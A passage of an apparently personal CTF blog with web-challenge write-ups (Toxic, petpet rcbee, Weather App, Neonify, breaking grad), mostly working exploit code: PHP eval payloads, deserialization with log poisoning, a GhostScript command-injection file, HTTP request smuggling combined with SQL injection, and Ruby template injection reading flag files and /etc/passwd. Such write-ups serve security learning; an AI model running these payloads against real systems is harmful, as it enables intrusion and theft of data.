+<p>Due to <code>addslashes</code>, our payload cannot contains quotes and backslash</p>
+<p>We can use <code>$_GET</code> to escape or <code>chr(num)</code> to concat a string.</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">format</span>=$&#123;<span class="hljs-keyword">system</span>(chr(<span class="hljs-number">99</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">116</span>).chr(<span class="hljs-number">32</span>).chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">42</span>))&#125;<br># cat /f*<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">format</span>=$&#123;<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>])&#125;&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h1 id="Toxic"><a href="#Toxic" class="headerlink" title="Toxic"></a>Toxic</h1><blockquote>
+<p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸</p>
+</blockquote>
+<p>Easy PHP deserialization🙌</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PageModel</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;file);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageModel</span>;<br>    <span class="hljs-variable">$page</span>-&gt;file = <span class="hljs-string">&#x27;/www/index.html&#x27;</span>;<br><br>    <span class="hljs-title function_ invoke__">setcookie</span>(<br>        <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>, <br>        <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$page</span>)), <br>        <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>, <br>        <span class="hljs-string">&#x27;/&#x27;</span><br>    );<br>&#125; <br><br><span class="hljs-variable">$cookie</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cookie</span>);<br></code></pre></td></tr></table></figure>
+
+<p>Try to read <code>/etc/passwd</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PageModel</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>&#125;<br><br><span class="hljs-variable">$page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageModel</span>();<br><span class="hljs-variable">$page</span>-&gt;file = <span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$page</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230807214545751.png" srcset="/img/loading.gif" lazyload alt="image-20230807214545751"></p>
+<p>Work as expected.</p>
+<p>What file is available to include to triger RCE?🧐</p>
+<p><code>data</code> protocol is an option (<code>data://text/plain,&lt;?php phpinfo();?&gt;</code>)</p>
+<p>But it’s more demanding</p>
+<p><code>allow_url_fopen</code> and <code>allow_url_include</code> needs to stay <em>On</em> in <code>php.ini</code></p>
+<p>Notice that the server uses <em>Nginx</em> as reverse proxy.</p>
+<p>We can include Nginx’s log file which located at <code>/var/log/nginx/access.log</code> by default.</p>
+<p>The log file will record our request information such as UA, IP, request path…</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://167.172.61.89:32297/&quot;</span><br><br>headers = &#123;<br>	<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);?&gt;&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==&quot;</span><br>&#125;<br><br>r = requests.get(url=url, headers=headers)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230807215931380.png" srcset="/img/loading.gif" lazyload alt="image-20230807215931380"></p>
+<h1 id="petpet-rcbee"><a href="#petpet-rcbee" class="headerlink" title="petpet rcbee"></a>petpet rcbee</h1><blockquote>
+<p>Bees are comfy 🍯<br>bees are great 🌟🌟🌟<br>this is a petpet generator 👋<br>let’s join forces and save the bees today! 🐝</p>
+</blockquote>
+<p>GhostScript RCE (version: &lt;&#x3D;9.2.4)</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">%!PS-Adobe-<span class="hljs-number">3.0</span> EPSF-<span class="hljs-number">3.0</span><br>%%BoundingBox: -<span class="hljs-number">0</span> -<span class="hljs-number">0</span> <span class="hljs-number">100</span> <span class="hljs-number">100</span><br><br>userdict /setpagedevice undef<br>save<br>legal<br>&#123; <span class="hljs-keyword">null</span> restore &#125; stopped &#123; <span class="hljs-keyword">pop</span> &#125; <span class="hljs-keyword">if</span><br>&#123; legal &#125; stopped &#123; <span class="hljs-keyword">pop</span> &#125; <span class="hljs-keyword">if</span><br>restore<br>mark <span class="hljs-regexp">/OutputFile (%pipe%cat flag &gt;&gt; /</span>app<span class="hljs-regexp">/application/</span><span class="hljs-keyword">static</span><span class="hljs-regexp">/petpets/</span>flag.txt) currentdevice putdeviceprops<br></code></pre></td></tr></table></figure>
+
+<h1 id="Weather-App"><a href="#Weather-App" class="headerlink" title="Weather App"></a>Weather App</h1><blockquote>
+<p>A pit of eternal  darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I’m hallucinating with the memories of my past life,  it’s a reflection of how thought I would have turned out if I had tried  enough. A weatherman, I said! Someone my community would look up to,  someone who is to be respected. I guess this is my way of telling you  that I’ve been waiting for someone to come and save me. This weather  application is notorious for trapping the souls of ambitious weathermen  like me. Please defeat the evil bruxa that’s operating this website and  set me free! 🧙‍♀️</p>
+</blockquote>
+<p>Download the source code. node8 + express + sqlite</p>
+<p>Table Structure:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> users;<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> users (<br>     id         <span class="hljs-type">INTEGER</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTOINCREMENT,<br>     username   <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">UNIQUE</span>,<br>     password   <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, password) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>Flag will be revealed if we log in as admin</p>
+<p>There is a SQL injection vul in the <em>register function</em></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;user&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;pass&#125;</span>&#x27;)`</span>;<br><span class="hljs-title function_">resolve</span>((<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">run</span>(query)));<br></code></pre></td></tr></table></figure>
+
+<p>Due to the config of unique usernames, we can’t register a “new admin”. But thanks to sqlite’s special syntax, we can “do something” after the error raised by <em>Insert Statement</em>. The following SQL statement shows that we can execute a SQL statement when a conflict on fields occurs in <em>Inserting Statement</em></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, password) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;1337&#x27;</span>) <span class="hljs-keyword">ON</span> CONFLICT(username) DO <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">SET</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>However, things are not so easy.</p>
+<p>The register router access requires local IP</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>	<span class="hljs-keyword">if</span> (req.<span class="hljs-property">socket</span>.<span class="hljs-property">remoteAddress</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.*:/</span>, <span class="hljs-string">&#x27;&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>		<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">end</span>();<br>	&#125;<br>	<span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br>	<span class="hljs-keyword">if</span> (username &amp;&amp; password) &#123;<br>		<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">register</span>(username, password)<br>			.<span class="hljs-title function_">then</span>(<span class="hljs-function">()  =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Successfully registered&#x27;</span>)))<br>			.<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>)));<br>	&#125;<br>	<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>The main function of this website is providing weather forecast.</p>
+<p>Capturing http messages on the browser side, I find that a hostname is posted from browser which will be accessed by the server.(The real world weather forecast server host)</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;endpoint&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;api.openweathermap.org&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;city&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Nanjing&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;country&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CN&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>We can check this out from the source code</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/weather&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>	<span class="hljs-keyword">let</span> &#123; endpoint, city, country &#125; = req.<span class="hljs-property">body</span>;<br>	<span class="hljs-keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title class_">WeatherHelper</span>.<span class="hljs-title function_">getWeather</span>(res, endpoint, city, country);<br>	&#125;<br>	<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Missing parameters&#x27;</span>));<br>&#125;);	<br></code></pre></td></tr></table></figure>
+
+<p><code>WeatherHelper#getWeather</code> calls <code>HttpHelper.HttpGet</code> to get weather data</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">HttpHelper</span>.<span class="hljs-title class_">HttpGet</span>(<span class="hljs-string">`http://<span class="hljs-subst">$&#123;endpoint&#125;</span>/data/2.5/weather?q=<span class="hljs-subst">$&#123;city&#125;</span>,<span class="hljs-subst">$&#123;country&#125;</span>&amp;units=metric&amp;appid=<span class="hljs-subst">$&#123;apiKey&#125;</span>`</span>);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>	<span class="hljs-title class_">HttpGet</span>(url) &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>			http.<span class="hljs-title function_">get</span>(url, <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>				<span class="hljs-keyword">let</span> body = <span class="hljs-string">&#x27;&#x27;</span>;<br>				res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-params">chunk</span> =&gt;</span> body += chunk);<br>				res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>					<span class="hljs-keyword">try</span> &#123;<br>						<span class="hljs-title function_">resolve</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(body));<br>					&#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>						<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>);<br>					&#125;<br>				&#125;);<br>			&#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, reject);<br>		&#125;);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Notice that the node version is 8, the http module in this version does not strictly use the CRLF sequence to  delimit HTTP requests which can lead to HTTP Request Smuggling.</p>
+<blockquote>
+<p>space –&gt; \u0120<br>\r –&gt; \u010D<br>\n –&gt; \u010A</p>
+</blockquote>
+<p>Combining the above SQL injection vul, we can weave the following POC.</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/path</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">HOST</span><span class="hljs-punctuation">: </span>ip<br></code></pre></td></tr></table></figure>
+
+<p>transform to👇</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><br><span class="language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/register</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1</span><br><span class="language-http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="language-http"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>xxx</span><br><span class="language-http"></span><br><span class="language-http"><span class="language-routeros"><span class="hljs-attribute">username</span>=admin&amp;password=SQLi</span></span><br><span class="language-routeros"><span class="language-http"></span></span><br><span class="language-routeros"><span class="language-http"><span class="hljs-built_in">GET</span> / HTTP/1.1</span></span><br><span class="language-routeros"><span class="language-http">Host: 127.0.0.1</span></span><br></code></pre></td></tr></table></figure>
+
+<p>ip&#x3D;127.0.0.1    path👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br>POST /register HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Content-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded<br>Content-Length: xxx<br><br>username=admin&amp;password=SQLi<br><br>GET /<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://157.245.39.76:32459/api/weather&quot;</span><br><br>payload = <span class="hljs-string">&quot;username=admin&amp;password=1&#x27;) ON CONFLICT(username) DO UPDATE SET password = &#x27;123456&#x27;;--&quot;</span><br>payload = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>).replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;%27&quot;</span>).replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;%3B&quot;</span>)<br><br>path = <span class="hljs-string">f&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /register HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(payload)&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;payload&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">GET /&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\u010D&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\u010A&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;\u0120&quot;</span>)<br><br>data = &#123;<br>    <span class="hljs-string">&quot;endpoint&quot;</span>: <span class="hljs-string">f&quot;127.0.0.1/<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>,<br>    <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<br>    <span class="hljs-string">&quot;country&quot;</span>: <span class="hljs-string">&quot;CN&quot;</span><br>&#125;<br>r = requests.post(url=url, json=data)<br></code></pre></td></tr></table></figure>
+
+<h1 id="Neonify"><a href="#Neonify" class="headerlink" title="Neonify"></a>Neonify</h1><blockquote>
+<p>It’s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand  new website and make any text glow like a lo-fi neon tube!</p>
+</blockquote>
+<p>Ruby SSTI</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">&lt;% %&gt; -&gt;<span class="hljs-built_in"> execute </span>Ruby Code<br><br>&lt;%= %&gt; -&gt; do some printing<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby">post <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:neon</span>] =~ <span class="hljs-regexp">/^[0-9a-z ]+$/i</span><br>        <span class="hljs-variable">@neon</span> = <span class="hljs-variable constant_">ERB</span>.new(params[<span class="hljs-symbol">:neon</span>]).result(binding)<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">@neon</span> = <span class="hljs-string">&quot;Malicious Input Detected&quot;</span><br>    <span class="hljs-keyword">end</span><br>    erb <span class="hljs-symbol">:<span class="hljs-string">&#x27;index&#x27;</span></span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<p>A <em>line feed</em> can bypass the regexp check</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">neon=<span class="hljs-number">6666</span>%0a11&lt;%25=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;|cat f*&#x27;</span>).read()%25&gt;<br></code></pre></td></tr></table></figure>
+
+<h1 id="breaking-grad"><a href="#breaking-grad" class="headerlink" title="breaking grad"></a>breaking grad</h1><blockquote>
+<p>You and your buddy  corrected the math in your physics teacher’s paper on the decay of  highly excited massive string states in the footnote of a renowned  publication. He’s just failed your thesis out of spite, for making a  fool out of him in the university’s research symposium. Now you can’t  graduate, unless you can do something about it… 🤷</p>
+</blockquote>
+<p>Two routes for this web application:</p>
+<p>GET: &#x2F;debug&#x2F;:action</p>
+<p>post: &#x2F;api&#x2F;calculate</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/debug/:action&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">DebugHelper</span>.<span class="hljs-title function_">execute</span>(res, req.<span class="hljs-property">params</span>.<span class="hljs-property">action</span>);<br>&#125;);<br><span class="hljs-comment">// DebugHelper.js</span><br><span class="hljs-keyword">const</span> &#123; execSync, fork &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-title function_">execute</span>(<span class="hljs-params">res, command</span>) &#123;<br>        res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;txt&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (command == <span class="hljs-string">&#x27;version&#x27;</span>) &#123;<br>            <span class="hljs-keyword">let</span> proc = <span class="hljs-title function_">fork</span>(<span class="hljs-string">&#x27;VersionCheck.js&#x27;</span>, [], &#123;<br>                <span class="hljs-attr">stdio</span>: [<span class="hljs-string">&#x27;ignore&#x27;</span>, <span class="hljs-string">&#x27;pipe&#x27;</span>, <span class="hljs-string">&#x27;pipe&#x27;</span>, <span class="hljs-string">&#x27;ipc&#x27;</span>]<br>            &#125;);<br>            proc.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">pipe</span>(res);<br>            proc.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">pipe</span>(res);<br>            <span class="hljs-keyword">return</span>;<br>        &#125; <br>        <span class="hljs-keyword">if</span> (command == <span class="hljs-string">&#x27;ram&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;free -m&#x27;</span>).<span class="hljs-title function_">toString</span>());<br>        &#125;  <br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;invalid command&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>DebugHelper is used to execute limited command…</p>
